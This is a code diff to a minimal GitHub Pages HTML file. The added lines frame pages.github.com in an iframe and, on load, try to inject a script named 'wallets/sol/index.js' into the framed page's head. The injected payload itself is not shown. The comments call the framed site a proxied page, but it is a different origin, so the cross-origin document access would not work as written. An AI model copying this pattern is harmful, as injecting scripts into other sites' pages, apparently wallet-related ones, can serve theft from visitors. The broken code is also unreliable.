@@ -11,5 +11,23 @@
         <h1>Hello, World!</h1>
         <p>Welcome to my simple GitHub Pages site.</p>
     </div>
+ <!-- Iframe pointing to the proxied page -->
+  <iframe id="myIframe" src="https://pages.github.com"></iframe>
+
+  <script>
+    function injectScript() {
+      const iframe = document.getElementById('myIframe');
+      const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+
+      // Inject a script into the proxied page
+      const script = document.createElement('script');
+      script.src = 'https://localhost/wallets/sol/index.js'; // Your local script
+      iframeDocument.head.appendChild(script);
+
+      console.log('Script injected successfully.');
+    }
+
+    document.getElementById('myIframe').onload = injectScript;
+  </script>
 </body>
 </html>
